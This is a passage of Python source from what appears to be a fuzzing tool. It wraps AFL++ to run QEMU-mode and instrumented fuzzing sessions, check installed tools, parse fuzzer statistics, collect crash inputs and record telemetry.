                "AFL++ QEMU mode uses a modified QEMU user-mode emulator to provide "
                "coverage-guided fuzzing for uninstrumented binaries. It implements "
                "edge coverage tracking via TCG (Tiny Code Generator) instrumentation."
            )
            
        # Architecture support from capabilities
        caps = self.check_capabilities()
        help_info["architecture_support"] = {
            "available": caps.architectures,
            "all_supported": [a.value for a in QemuArchitecture if a != QemuArchitecture.UNKNOWN],
        }
        
        help_info["examples"] = [
            {
                "title": "Basic QEMU fuzzing",
                "command": "afl-fuzz -Q -i seeds/ -o output/ -- ./target @@",
                "description": "Fuzz target binary using standard QEMU mode",
            },
            {
                "title": "With comparison coverage",
                "env": "AFL_COMPCOV_LEVEL=2",
                "command": "afl-fuzz -Q -i seeds/ -o output/ -- ./target @@",
                "description": "Enable comparison coverage for better magic byte handling",
            },
            {
                "title": "Persistent mode",
                "env": "AFL_QEMU_PERSISTENT_ADDR=0x400a00 AFL_QEMU_PERSISTENT_CNT=10000",
                "command": "afl-fuzz -Q -i seeds/ -o output/ -- ./target @@",
                "description": "Run in persistent mode (requires valid entry point address)",
            },
        ]
        
        return help_info


# Global QEMU manager instance
_qemu_manager = QemuModeManager()


def get_qemu_capabilities() -> Dict[str, Any]:
    """Get QEMU mode capabilities."""
    return _qemu_manager.check_capabilities().to_dict()


def detect_binary_arch(binary_path: str) -> Dict[str, Any]:
    """Detect binary architecture and properties."""
    info = _qemu_manager.detect_binary_architecture(binary_path)
    return info.to_dict()


def get_qemu_recommendations(binary_path: str) -> Dict[str, Any]:
    """Get QEMU fuzzing recommendations for a binary."""
    return _qemu_manager.recommend_qemu_config(binary_path)


async def run_qemu_trace_analysis(
    binary_path: str,
    input_data: bytes,
    timeout: float = 30.0
) -> Dict[str, Any]:
    """Run QEMU trace analysis on an input."""
    analysis = await _qemu_manager.run_qemu_trace(binary_path, input_data, timeout)
    return analysis.to_dict()


def get_qemu_help(for_beginners: bool = True) -> Dict[str, Any]:
    """Get QEMU mode help documentation."""
    return _qemu_manager.get_qemu_mode_help(for_beginners)


# =============================================================================
# AFL++ INTEGRATION
# =============================================================================

class AflPlusPlusFuzzer:
    """
    AFL++ (American Fuzzy Lop Plus Plus) integration for industrial-grade fuzzing.
    
    AFL++ is a coverage-guided fuzzer that uses compile-time instrumentation
    or binary-level instrumentation (QEMU mode) to discover crashes and bugs.
    
    Features:
    - Coverage-guided mutation
    - Multiple mutation strategies  
    - Deterministic and havoc stages
    - Crash deduplication
    - Parallel fuzzing support
    """
    
    AFL_FUZZ_PATH = "/usr/local/bin/afl-fuzz"
    AFL_QEMU_MODE = "-Q"  # For non-instrumented binaries
    
    def __init__(
        self,
        target_path: str,
        target_args: str = "@@",
        input_dir: str = "/fuzzing/seeds",
        output_dir: str = "/fuzzing/output",
        timeout_ms: int = 5000,
        memory_limit_mb: int = 256,
        use_qemu: bool = True,  # Use QEMU mode for uninstrumented binaries
        session_id: Optional[str] = None,
        output_dir_is_session: bool = False,
        dictionary_path: Optional[str] = None,
        env_vars: Optional[Dict[str, str]] = None,
        extra_afl_flags: Optional[List[str]] = None,
        qemu_mode: Optional[QemuModeType] = None,
        persistent_address: Optional[str] = None,
        persistent_count: int = 10000,
        persistent_hook: Optional[str] = None,
        enable_compcov: bool = False,
        enable_instrim: bool = False,
        telemetry_dir: Optional[str] = None,
        telemetry_interval_sec: float = 2.0,
    ):
        self.session_id = session_id or str(uuid.uuid4())
        self.target_path = target_path
        self.target_args = target_args
        self.input_dir = input_dir
        self.output_dir = output_dir if output_dir_is_session else os.path.join(output_dir, self.session_id)
        self.timeout_ms = timeout_ms
        self.memory_limit_mb = memory_limit_mb
        self.use_qemu = use_qemu
        self.dictionary_path = dictionary_path
        self.env_vars = env_vars or {}
        self.extra_afl_flags = extra_afl_flags or []
        self.qemu_mode = qemu_mode or (QemuModeType.STANDARD if use_qemu else None)
        self.persistent_address = persistent_address
        self.persistent_count = persistent_count
        self.persistent_hook = persistent_hook
        self.enable_compcov = enable_compcov
        self.enable_instrim = enable_instrim
        self.telemetry_dir = telemetry_dir or os.path.join(self.output_dir, "telemetry")
        self.telemetry = None
        self.telemetry_interval_sec = max(0.5, telemetry_interval_sec)
        self._last_telemetry_ts = 0.0
        self._stop_requested = False
        
        # Process handle
        self._process: Optional[asyncio.subprocess.Process] = None
        self._running = False
        self._start_time: Optional[float] = None
        
        # Stats
        self.stats = {
            "execs_done": 0,
            "execs_per_sec": 0,
            "paths_total": 0,
            "paths_found": 0,
            "unique_crashes": 0,
            "unique_hangs": 0,
            "last_path_time": 0,
            "last_crash_time": 0,
            "cycle_done": 0,
            "pending_total": 0,
            "pending_favs": 0,
            "map_coverage": 0.0,
            "stability": 0.0,
        }
        
        # Create directories
        os.makedirs(self.output_dir, exist_ok=True)
        os.makedirs(self.input_dir, exist_ok=True)
        
        # Ensure there's at least one seed
        self._ensure_initial_seed()

        if self.telemetry_dir:
            metadata = {
                "target_path": self.target_path,
                "target_args": self.target_args,
                "input_dir": self.input_dir,
                "output_dir": self.output_dir,
                "timeout_ms": self.timeout_ms,
                "memory_limit_mb": self.memory_limit_mb,
                "use_qemu": self.use_qemu,
                "qemu_mode": self.qemu_mode.value if self.qemu_mode else None,
                "dictionary_path": self.dictionary_path,
                "extra_afl_flags": self.extra_afl_flags,
                "command": " ".join(self._build_command()),
            }
            try:
                self.telemetry = AflTelemetryRecorder(self.telemetry_dir, self.session_id, metadata)
            except Exception as e:
                logger.warning(f"Failed to initialize AFL telemetry: {e}")
    
    def _ensure_initial_seed(self):
        """Ensure input directory has at least one seed file."""
        seeds = list(Path(self.input_dir).glob("*"))
        if not seeds:
            seed_file = os.path.join(self.input_dir, "default_seed")
            with open(seed_file, "wb") as f:
                f.write(b"AAAA")  # Minimal seed
            logger.info(f"Created default seed at {seed_file}")
    
    @staticmethod
    def is_available() -> Dict[str, Any]:
        """Check if AFL++ is installed and available."""
        result = {
            "installed": False,
            "version": None,
            "tools": {
                "afl-fuzz": None,
                "afl-gcc": None,
                "afl-clang": None,
                "afl-clang-fast": None,
                "afl-clang-fast++": None,
                "afl-cmin": None,
                "afl-tmin": None,
                "afl-showmap": None,
                "afl-qemu-trace": None,
            }
        }
        
        # Check afl-fuzz
        try:
            proc = subprocess.run(
                [AflPlusPlusFuzzer.AFL_FUZZ_PATH, "--version"],
                capture_output=True,
                text=True,
                timeout=5
            )
            if proc.returncode == 0:
                result["installed"] = True
                # Parse version from output
                version_line = proc.stdout.strip().split('\n')[0] if proc.stdout else ""
                result["version"] = version_line or "installed"
                result["tools"]["afl-fuzz"] = AflPlusPlusFuzzer.AFL_FUZZ_PATH
        except FileNotFoundError:
            # Try alternative paths
            for path in ["/opt/AFLplusplus/afl-fuzz", "/usr/bin/afl-fuzz", "afl-fuzz"]:
                try:
                    proc = subprocess.run(
                        [path, "--version"],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    if proc.returncode == 0:
                        result["installed"] = True
                        result["version"] = proc.stdout.strip().split('\n')[0] if proc.stdout else "installed"
                        result["tools"]["afl-fuzz"] = path
                        AflPlusPlusFuzzer.AFL_FUZZ_PATH = path
                        break
                except:
                    continue
        except Exception as e:
            logger.warning(f"Error checking AFL++: {e}")
        
        # Check other tools
        for tool in [
            "afl-gcc",
            "afl-clang",
            "afl-clang-fast",
            "afl-clang-fast++",
            "afl-cmin",
            "afl-tmin",
            "afl-showmap",
            "afl-qemu-trace",
        ]:
            for base_path in ["/usr/local/bin/", "/opt/AFLplusplus/", "/usr/bin/", ""]:
                try:
                    path = f"{base_path}{tool}"
                    proc = subprocess.run(
                        [path, "--version"],
                        capture_output=True,
                        timeout=5
                    )
                    if proc.returncode == 0:
                        result["tools"][tool] = path
                        break
                except:
                    continue
        
        return result
    
    def _build_command(self) -> List[str]:
        """Build AFL++ command line."""
        cmd = [
            self.AFL_FUZZ_PATH,
            "-i", self.input_dir,
            "-o", self.output_dir,
            "-t", str(self.timeout_ms),
            "-m", str(self.memory_limit_mb),
        ]
        
        # Use QEMU mode for non-instrumented binaries
        if self.use_qemu:
            cmd.append(self.AFL_QEMU_MODE)
        
        # Dictionary
        if self.dictionary_path and os.path.isfile(self.dictionary_path):
            cmd.extend(["-x", self.dictionary_path])
        
        # Extra flags
        if self.extra_afl_flags:
            cmd.extend(self.extra_afl_flags)
        
        # Add target and args
        cmd.append("--")
        cmd.append(self.target_path)
        
        # Parse target args
        if self.target_args:
            args = shlex.split(self.target_args, posix=os.name != "nt")
            cmd.extend(args)
        
        return cmd
    
    async def start(self) -> AsyncGenerator[Dict[str, Any], None]:
        """Start AFL++ fuzzing session."""
        end_status = "completed"
        end_error = None
        # Check if AFL++ is available
        availability = self.is_available()
        if not availability["installed"]:
            yield {
                "type": "error",
                "error": "AFL++ not installed. Please install AFL++ or use built-in fuzzer.",
                "suggestion": "Install with: apt-get install afl++ or build from source"
            }
            return
        
        # Build command
        cmd = self._build_command()
        logger.info(f"Starting AFL++: {' '.join(cmd)}")
        
        yield {
            "type": "session_start",
            "session_id": self.session_id,
            "target": self.target_path,
            "output_dir": self.output_dir,
            "telemetry_dir": self.telemetry_dir,
            "mode": "afl++",
            "command": " ".join(cmd),
        }
        
        try:
            # Set AFL_NO_UI for non-interactive mode
            env = os.environ.copy()
            env["AFL_NO_UI"] = "1"
            env["AFL_SKIP_CPUFREQ"] = "1"  # Skip CPU frequency check
            env["AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES"] = "1"
            
            if self.use_qemu and self.qemu_mode == QemuModeType.PERSISTENT and self.persistent_address:
                env["AFL_QEMU_PERSISTENT_ADDR"] = self.persistent_address
                env["AFL_QEMU_PERSISTENT_CNT"] = str(self.persistent_count)
                if self.persistent_hook:
                    env["AFL_QEMU_PERSISTENT_HOOK"] = self.persistent_hook
            
            if self.enable_compcov or (self.use_qemu and self.qemu_mode == QemuModeType.COMPCOV):
                env["AFL_COMPCOV_LEVEL"] = "2"
            
            if self.enable_instrim:
                env["AFL_INST_RATIO"] = "50"
            
            if self.env_vars:
                env.update(self.env_vars)
            
            # Start process
            self._process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=env,
            )
            
            self._running = True
            self._start_time = time.time()
            
            # Monitor loop
            while self._running and self._process.returncode is None:
                # Parse fuzzer_stats file
                await self._parse_stats()

                if self.telemetry:
                    now = time.time()
                    if now - self._last_telemetry_ts >= self.telemetry_interval_sec:
                        queue_stats = get_afl_dir_stats(
                            os.path.join(self.output_dir, "default", "queue"),
                        )
                        crash_stats = get_afl_dir_stats(
                            os.path.join(self.output_dir, "default", "crashes"),
                            skip_names={"README.txt"},
                        )
                        hang_stats = get_afl_dir_stats(
                            os.path.join(self.output_dir, "default", "hangs"),
                            skip_names={"README.txt"},
                        )
                        try:
                            self.telemetry.record_sample(
                                stats=self.stats.copy(),
                                queue=queue_stats,
                                crashes=crash_stats,
                                hangs=hang_stats,
                                runtime_seconds=time.time() - self._start_time,
                            )
                        except Exception as e:
                            logger.debug(f"Telemetry sample failed: {e}")
                        self._last_telemetry_ts = now
                
                # Check for new crashes
                crashes = await self._get_crashes()
                
                # Yield status update
                yield {
                    "type": "status",
                    "session_id": self.session_id,
                    "stats": self.stats.copy(),
                    "crashes": crashes,
                    "runtime_seconds": time.time() - self._start_time,
                    "telemetry_dir": self.telemetry_dir,
                }
                
                await asyncio.sleep(2)  # Update every 2 seconds
            
            # Final status
            yield {
                "type": "session_end",
                "session_id": self.session_id,
                "stats": self.stats.copy(),
                "crashes": await self._get_crashes(),
                "runtime_seconds": time.time() - self._start_time if self._start_time else 0,
                "telemetry_dir": self.telemetry_dir,
            }
            
        except Exception as e:
            logger.exception(f"AFL++ error: {e}")
            end_status = "error"
            end_error = str(e)
            yield {
                "type": "error",
                "error": str(e),
                "session_id": self.session_id,
            }
        finally:
            if self.telemetry and self._start_time:
                try:
                    self.telemetry.finalize(
                        status="stopped" if self._stop_requested else end_status,
                        runtime_seconds=time.time() - self._start_time,
                        final_stats=self.stats.copy(),
                        error=end_error,
                    )
                except Exception as e:
                    logger.debug(f"Telemetry finalize failed: {e}")
            await self.stop()
    
    async def _parse_stats(self):
        """Parse AFL++ fuzzer_stats file for real-time stats."""
        stats_file = os.path.join(self.output_dir, "default", "fuzzer_stats")
        try:
            if os.path.exists(stats_file):
                with open(stats_file, "r") as f:
                    for line in f:
                        if ":" in line:
                            key, value = line.strip().split(":", 1)
                            key = key.strip()
                            value = value.strip()
                            
                            # Map AFL++ stats to our format
                            stat_mapping = {
                                "execs_done": "execs_done",
                                "execs_per_sec": "execs_per_sec",
                                "paths_total": "paths_total",
                                "paths_found": "paths_found",
                                "unique_crashes": "unique_crashes",
                                "unique_hangs": "unique_hangs",
                                "last_path": "last_path_time",
                                "last_crash": "last_crash_time",
                                "cycles_done": "cycle_done",
                                "pending_total": "pending_total",
                                "pending_favs": "pending_favs",
                                "bitmap_cvg": "map_coverage",
                                "stability": "stability",
                            }
                            
                            if key in stat_mapping:
                                try:
                                    if key in ["bitmap_cvg", "stability"]:
                                        # Parse percentage
                                        self.stats[stat_mapping[key]] = float(value.replace("%", ""))
                                    else:
                                        self.stats[stat_mapping[key]] = int(float(value))
                                except ValueError:
                                    pass
        except Exception as e:
            logger.debug(f"Error parsing stats: {e}")
    
    async def _get_crashes(self) -> List[Dict[str, Any]]:
        """Get list of discovered crashes."""
        crashes = []
        crashes_dir = os.path.join(self.output_dir, "default", "crashes")
        
        try:
            if os.path.isdir(crashes_dir):
                for filename in os.listdir(crashes_dir):
                    if filename == "README.txt":
                        continue
                    
                    filepath = os.path.join(crashes_dir, filename)
                    if os.path.isfile(filepath):
                        stat = os.stat(filepath)
                        
                        # Read crash input
                        with open(filepath, "rb") as f:
                            data = f.read()
                        
                        crashes.append({
                            "id": filename,
                            "file": filepath,
                            "size": stat.st_size,
                            "timestamp": stat.st_mtime,
                            "input_preview": data[:100].hex() if data else "",
                        })
        except Exception as e:
            logger.debug(f"Error getting crashes: {e}")
        
        return crashes
    
    async def stop(self):
        """Stop AFL++ fuzzing session."""
        self._running = False
        self._stop_requested = True
        if self._process and self._process.returncode is None:
            try:
                self._process.terminate()
                await asyncio.wait_for(self._process.wait(), timeout=5)
            except asyncio.TimeoutError:
                self._process.kill()
            except Exception as e:
                logger.warning(f"Error stopping AFL++: {e}")
    
    def get_corpus(self) -> List[Dict[str, Any]]:
        """Get discovered corpus files."""
        corpus = []
        queue_dir = os.path.join(self.output_dir, "default", "queue")
        
        try:
            if os.path.isdir(queue_dir):
                for filename in os.listdir(queue_dir):
                    filepath = os.path.join(queue_dir, filename)
                    if os.path.isfile(filepath):
                        stat = os.stat(filepath)
                        
                        # Read input
                        with open(filepath, "rb") as f:
                            data = f.read()
                        
                        corpus.append({
                            "id": filename,
                            "file": filepath,
                            "size": stat.st_size,
                            "timestamp": stat.st_mtime,
                            "preview": data[:100].hex() if data else "",
                        })
        except Exception as e:
            logger.debug(f"Error getting corpus: {e}")
        
        return corpus
    
    def get_status(self) -> Dict[str, Any]:
        """Get current fuzzing status."""
        return {
            "session_id": self.session_id,
            "running": self._running,
            "stats": self.stats.copy(),
            "target": self.target_path,
            "runtime_seconds": time.time() - self._start_time if self._start_time else 0,
            "telemetry_dir": self.telemetry_dir,
        }


# Active AFL++ sessions
_active_afl_fuzzers: Dict[str, AflPlusPlusFuzzer] = {}


def _escape_afl_dictionary_bytes(data: bytes) -> str:
    """Escape bytes for AFL dictionary format."""
    escaped = []
    for b in data:
        if 32 <= b <= 126 and b not in (34, 92):
            escaped.append(chr(b))
        elif b == 34:
            escaped.append('\\"')
        elif b == 92:
            escaped.append('\\\\')
        else:
            escaped.append(f"\\x{b:02x}")
    return "".join(escaped)


def _write_afl_dictionary_file(dictionary: List[str], output_dir: str) -> Optional[str]:
    """Write AFL dictionary entries to a file and return its path."""
    if not dictionary:
        return None
    
    dict_dir = os.path.join(output_dir, "dictionaries")
    os.makedirs(dict_dir, exist_ok=True)
    dict_path = os.path.join(dict_dir, "afl_dictionary.txt")
    
    try:
        with open(dict_path, "w", encoding="utf-8") as f:
            for i, entry in enumerate(dictionary):
                if entry is None:
                    continue
                data = entry if isinstance(entry, bytes) else str(entry).encode("utf-8", errors="replace")
                escaped = _escape_afl_dictionary_bytes(data)
                f.write(f"key{i}=\"{escaped}\"\n")
    except Exception:
        return None
    
    return dict_path


def find_afl_tool(tool_name: str) -> Optional[str]:
    candidates = ["/usr/local/bin", "/opt/AFLplusplus", "/usr/bin", ""]
    names = [tool_name]
    if os.name == "nt":
        names = [f"{tool_name}.exe", f"{tool_name}.bat", f"{tool_name}.cmd", tool_name]

    for base in candidates:
        for name in names:
            path = os.path.join(base, name) if base else name
            if os.path.isfile(path) and os.access(path, os.X_OK):
                return path

    for name in names:
        path = shutil.which(name)
        if path:
            return path

    return None


def _resolve_qemu_mode(qemu_mode: Optional[str]) -> Optional[QemuModeType]:
    if not qemu_mode:
        return None
    if isinstance(qemu_mode, QemuModeType):
        return qemu_mode
    try:
        return QemuModeType(str(qemu_mode))
    except ValueError:
        return None


def _select_seed_file(input_dir: str) -> Optional[str]:
    try:
        for entry in sorted(Path(input_dir).iterdir()):
            if entry.is_file():
                return str(entry)
    except Exception:
        return None
    return None


def _check_afl_instrumentation(
    target_path: str,
    target_args: str,
    input_dir: str,
    showmap_path: str,
    timeout_ms: int,
    memory_limit_mb: int,
    env_vars: Optional[Dict[str, str]] = None,
) -> Dict[str, Any]:
    result = {
        "checked": False,
        "detected": False,
        "edges": 0,
        "returncode": None,
        "command": None,
        "error": None,
    }

    seed_path = _select_seed_file(input_dir)
    if not seed_path:
        result["error"] = "No seed files available for instrumentation check."
        return result

    input_bytes: Optional[bytes] = None
    try:
        input_bytes = Path(seed_path).read_bytes()
    except Exception:
        input_bytes = b"AAAA"

    if "@@" in (target_args or ""):
        args_template = (target_args or "").replace("@@", seed_path)
        input_payload = None
    else:
        args_template = target_args or ""
        input_payload = input_bytes

    args = shlex.split(args_template, posix=os.name != "nt") if args_template else []
    target_cmd = [target_path] + args

    with tempfile.NamedTemporaryFile(delete=False, suffix=".map") as out_file:
        output_path = out_file.name

    showmap_cmd = [
        showmap_path,
        "-q",
        "-o",
        output_path,
        "-t",
        str(timeout_ms),
        "-m",
        str(memory_limit_mb),
        "--",
    ] + target_cmd
    result["command"] = " ".join(showmap_cmd)

    env = os.environ.copy()
    if env_vars:
        env.update(env_vars)

    try:
        proc = subprocess.run(
            showmap_cmd,
            input=input_payload,
            capture_output=True,
            timeout=max(1.0, timeout_ms / 1000.0 + 1.0),
            env=env,
        )
        result["checked"] = True
        result["returncode"] = proc.returncode
        if proc.returncode != 0:
            stderr_text = proc.stderr.decode("utf-8", errors="replace")
            result["error"] = stderr_text.strip() or "afl-showmap failed"
            return result

        edges = 0
        try:
            with open(output_path, "r", encoding="utf-8", errors="replace") as handle:
                for line in handle:
                    if line.strip():
                        edges += 1
        except Exception:
            edges = 0
        result["edges"] = edges
        result["detected"] = edges > 0
        if edges == 0:
            result["error"] = "No instrumentation detected by afl-showmap."
    except subprocess.TimeoutExpired:
        result["checked"] = True
        result["error"] = "afl-showmap timed out."
    except Exception as exc:
        result["error"] = str(exc)
    finally:
        try:
            os.unlink(output_path)
        except Exception:
            pass

    return result


def run_afl_preflight(
    target_path: str,
    target_args: str = "@@",
    input_dir: str = "/fuzzing/seeds",
    timeout_ms: int = 5000,
    memory_limit_mb: int = 256,
    use_qemu: bool = True,
    qemu_mode: Optional[str] = None,
    dictionary_path: Optional[str] = None,
    env_vars: Optional[Dict[str, str]] = None,
) -> Dict[str, Any]:
    result: Dict[str, Any] = {
        "ok": True,
        "errors": [],
        "warnings": [],
        "checks": {},
        "tools": {},
        "recommendations": [],
    }

    availability = check_afl_installation()
    result["tools"].update(availability.get("tools", {}))
    result["checks"]["afl_installed"] = bool(availability.get("installed"))

    if not availability.get("installed"):
        result["errors"].append({
            "code": "afl_not_installed",
            "message": "AFL++ not found (afl-fuzz missing).",
            "hint": "Install AFL++ and ensure afl-fuzz is on PATH.",
        })

    showmap_path = find_afl_tool("afl-showmap")
    result["tools"]["afl-showmap"] = showmap_path

    clang_fast = find_afl_tool("afl-clang-fast")
    result["tools"]["afl-clang-fast"] = clang_fast
    clang_fast_pp = find_afl_tool("afl-clang-fast++")
    result["tools"]["afl-clang-fast++"] = clang_fast_pp

    qemu_trace = find_afl_tool("afl-qemu-trace")
    result["tools"]["afl-qemu-trace"] = qemu_trace

    target_exists = os.path.isfile(target_path)
    result["checks"]["target_exists"] = target_exists
    if not target_exists:
        result["errors"].append({
            "code": "target_missing",
            "message": f"Target not found: {target_path}",
            "hint": "Provide a valid path to the target binary.",
        })
    else:
        if os.name != "nt" and not os.access(target_path, os.X_OK):
            result["errors"].append({
                "code": "target_not_executable",
                "message": "Target exists but is not executable.",
                "hint": "Run chmod +x on the binary or adjust permissions.",
            })

    input_dir_exists = os.path.isdir(input_dir)
    result["checks"]["input_dir_exists"] = input_dir_exists
    seed_count = 0
    if input_dir_exists:
        seed_count = len([p for p in Path(input_dir).iterdir() if p.is_file()])
    result["checks"]["seed_count"] = seed_count
    if not input_dir_exists:
        result["errors"].append({
            "code": "seed_dir_missing",
            "message": f"Seed directory not found: {input_dir}",
            "hint": "Create the directory and add at least one seed input.",
        })
    elif seed_count == 0:
        result["errors"].append({
            "code": "seed_dir_empty",
            "message": "Seed directory has no input files.",
            "hint": "Add seed files or enable ai_generate_seeds.",
        })

    if dictionary_path and not os.path.isfile(dictionary_path):
        result["errors"].append({
            "code": "dictionary_missing",
            "message": f"Dictionary path not found: {dictionary_path}",
            "hint": "Remove dictionary_path or provide a valid AFL dictionary file.",
        })

    resolved_qemu_mode = _resolve_qemu_mode(qemu_mode)
    if qemu_mode and not resolved_qemu_mode:
        result["errors"].append({
            "code": "invalid_qemu_mode",
            "message": f"Unsupported qemu_mode: {qemu_mode}",
            "hint": "Use standard, persistent, compcov, or instrim.",
        })

    if use_qemu:
        if not qemu_trace:
            result["errors"].append({
                "code": "qemu_missing",
                "message": "afl-qemu-trace not found for QEMU mode.",
                "hint": "Install AFL++ with QEMU support or disable use_qemu.",
            })
        if target_exists:
            qemu_recs = get_qemu_recommendations(target_path)
            result["checks"]["qemu_recommendations"] = qemu_recs
            if not qemu_recs.get("qemu_available", False):
                result["errors"].append({
                    "code": "qemu_unavailable",
                    "message": "QEMU mode is not available for this setup.",
                    "hint": qemu_recs.get("warnings", ["Install AFL++ QEMU support."])[0],
                })
            for warning in qemu_recs.get("warnings", []):
                result["warnings"].append({
                    "code": "qemu_warning",
                    "message": warning,
                })
    else:
        if not showmap_path:
            result["errors"].append({
                "code": "showmap_missing",
                "message": "afl-showmap is required for instrumentation checks.",
                "hint": "Install AFL++ tools or enable use_qemu.",
            })
        elif target_exists and input_dir_exists and seed_count > 0:
            instrumentation = _check_afl_instrumentation(
                target_path=target_path,
                target_args=target_args,
                input_dir=input_dir,
                showmap_path=showmap_path,
                timeout_ms=timeout_ms,
                memory_limit_mb=memory_limit_mb,
                env_vars=env_vars,
            )
            result["checks"]["instrumentation"] = instrumentation
            if not instrumentation.get("detected"):
                result["errors"].append({
                    "code": "no_instrumentation",
                    "message": "AFL++ instrumentation not detected.",
                    "hint": "Rebuild the target with afl-clang-fast or enable use_qemu.",
                })

    if not use_qemu:
        result["recommendations"].append({
            "id": "instrumented_build",
            "title": "Rebuild with AFL++ instrumentation",
            "details": "Compile the target with AFL++ compiler wrappers to enable coverage feedback.",
            "commands": [
                "CC=afl-clang-fast CXX=afl-clang-fast++ ./configure && make -j",
                "CC=afl-clang-fast CXX=afl-clang-fast++ cmake -S . -B build && cmake --build build",
            ],
            "env": ["AFL_USE_ASAN=1", "AFL_USE_UBSAN=1"],
        })
    else:
        result["recommendations"].append({
            "id": "qemu_mode",
            "title": "Use AFL++ QEMU mode for black-box binaries",
            "details": "QEMU mode fuzzes without compile-time instrumentation.",
            "commands": [
                "afl-fuzz -Q -i seeds -o output -- ./target @@",
            ],
        })

    result["ok"] = len(result["errors"]) == 0
    return result


async def start_afl_fuzzing(
    target_path: str,
    target_args: str = "@@",
    input_dir: str = "/fuzzing/seeds",
    output_dir: str = "/fuzzing/output",
    timeout_ms: int = 5000,
    memory_limit_mb: int = 256,
    use_qemu: bool = True,
    session_id: Optional[str] = None,
    output_dir_is_session: bool = False,
    dictionary: Optional[List[str]] = None,
    dictionary_path: Optional[str] = None,
    env_vars: Optional[Dict[str, str]] = None,
    extra_afl_flags: Optional[List[str]] = None,
    qemu_mode: Optional[str] = None,
    persistent_address: Optional[str] = None,
    persistent_count: int = 10000,
    persistent_hook: Optional[str] = None,
    enable_compcov: bool = False,
    enable_instrim: bool = False,
    telemetry_dir: Optional[str] = None,
    telemetry_interval_sec: float = 2.0,
) -> AsyncGenerator[Dict[str, Any], None]:
    """
    Start an AFL++ fuzzing session.
    
    Args:
        target_path: Path to target executable
        target_args: Command line template (@@ for input file)
        input_dir: Directory with seed inputs
        output_dir: Base output directory
        timeout_ms: Execution timeout in milliseconds
        memory_limit_mb: Memory limit in MB
        use_qemu: Use QEMU mode for uninstrumented binaries
        session_id: Optional session ID to force
        output_dir_is_session: Treat output_dir as session dir if True
        dictionary: Optional dictionary entries
        dictionary_path: Optional path to AFL dictionary
        env_vars: Additional environment variables
        extra_afl_flags: Extra AFL++ command flags
        qemu_mode: QEMU mode (standard, persistent, compcov)
        persistent_address: Persistent mode entry address
        persistent_count: Iterations per fork in persistent mode
        persistent_hook: Optional persistent hook library
        enable_compcov: Enable comparison coverage
        enable_instrim: Enable instruction trimming
        telemetry_dir: Optional telemetry output directory
        telemetry_interval_sec: Telemetry sampling interval in seconds
        
    Yields:
        Progress events
    """
    # Validate target exists
    if not os.path.isfile(target_path):
        yield {"type": "error", "error": f"Target not found: {target_path}"}
        return
    
    resolved_session_id = session_id or str(uuid.uuid4())
    final_output_dir = output_dir if output_dir_is_session else os.path.join(output_dir, resolved_session_id)
    os.makedirs(final_output_dir, exist_ok=True)
    
    resolved_qemu_mode = None
    if qemu_mode:
        if isinstance(qemu_mode, QemuModeType):
            resolved_qemu_mode = qemu_mode
        else:
            try:
                resolved_qemu_mode = QemuModeType(str(qemu_mode))
            except ValueError:
                resolved_qemu_mode = None
    
    dict_path = dictionary_path
    if dictionary:
        dict_path = _write_afl_dictionary_file(dictionary, final_output_dir) or dictionary_path

    resolved_telemetry_dir = telemetry_dir or os.path.join(final_output_dir, "telemetry")
    
    # Create fuzzer
    fuzzer = AflPlusPlusFuzzer(
        target_path=target_path,
        target_args=target_args,
        input_dir=input_dir,
        output_dir=final_output_dir,
        timeout_ms=timeout_ms,
        memory_limit_mb=memory_limit_mb,
        use_qemu=use_qemu,
        session_id=resolved_session_id,
        output_dir_is_session=True,
        dictionary_path=dict_path,
        env_vars=env_vars,
        extra_afl_flags=extra_afl_flags,
        qemu_mode=resolved_qemu_mode,
        persistent_address=persistent_address,
        persistent_count=persistent_count,
        persistent_hook=persistent_hook,
        enable_compcov=enable_compcov,
        enable_instrim=enable_instrim,
        telemetry_dir=resolved_telemetry_dir,
        telemetry_interval_sec=telemetry_interval_sec,
    )
    
    # Register
    _active_afl_fuzzers[fuzzer.session_id] = fuzzer
    
    try:
        async for event in fuzzer.start():
            yield event
    finally:
        if fuzzer.session_id in _active_afl_fuzzers:
            del _active_afl_fuzzers[fuzzer.session_id]


def stop_afl_session(session_id: str) -> Dict[str, Any]:
    """Stop an AFL++ fuzzing session (synchronous wrapper)."""
    fuzzer = _active_afl_fuzzers.get(session_id)
    if not fuzzer:
        return {"success": False, "error": "Session not found"}

    # Create task but don't wait (for backwards compatibility)
    asyncio.create_task(fuzzer.stop())
    return {"success": True, "message": f"AFL++ session {session_id} stopping"}


async def stop_afl_session_async(session_id: str, timeout: float = 10.0) -> Dict[str, Any]:
    """
    Stop an AFL++ fuzzing session and wait for it to fully terminate.

    This is the preferred method to ensure AFL processes are properly cleaned up.

    Args:
        session_id: The session ID to stop
        timeout: Maximum seconds to wait for AFL to stop (default 10s)

    Returns:
        Dict with success status and any error message
    """
    fuzzer = _active_afl_fuzzers.get(session_id)
    if not fuzzer:
        return {"success": False, "error": "Session not found"}

    try:
        # Wait for the stop with a timeout
        await asyncio.wait_for(fuzzer.stop(), timeout=timeout)
        return {"success": True, "message": f"AFL++ session {session_id} stopped"}
    except asyncio.TimeoutError:
        logger.warning(f"Timeout waiting for AFL++ session {session_id} to stop, forcing termination")
        # Force kill if graceful stop times out
        try:
            if fuzzer._process and fuzzer._process.returncode is None:
                fuzzer._process.kill()
                await asyncio.sleep(0.5)  # Brief wait for kill to take effect
        except Exception as e:
            logger.error(f"Error force-killing AFL++ session {session_id}: {e}")
        return {"success": True, "message": f"AFL++ session {session_id} force-stopped after timeout"}
    except Exception as e:
        logger.exception(f"Error stopping AFL++ session {session_id}: {e}")
        return {"success": False, "error": str(e)}


def get_afl_session_status(session_id: str) -> Optional[Dict[str, Any]]:
    """Get AFL++ session status."""
    fuzzer = _active_afl_fuzzers.get(session_id)
    if not fuzzer:
        return None
    return fuzzer.get_status()


def check_afl_installation() -> Dict[str, Any]:
    """Check AFL++ installation status."""
    return AflPlusPlusFuzzer.is_available()


# =============================================================================
# FUZZING REPORT EXPORT (Phase 5)
# =============================================================================

class FuzzingReportGenerator:
    """
    Generate comprehensive fuzzing session reports.
    
    Supports Markdown, JSON, and HTML formats with exploitability focus.
    """
    
    @staticmethod
    def generate_markdown_report(
        session: Dict[str, Any],
        crashes: List[Dict[str, Any]],
        memory_safety_report: Optional[Dict[str, Any]] = None,
        coverage_stats: Optional[Dict[str, Any]] = None,
        include_poc: bool = True,
    ) -> str:
        """
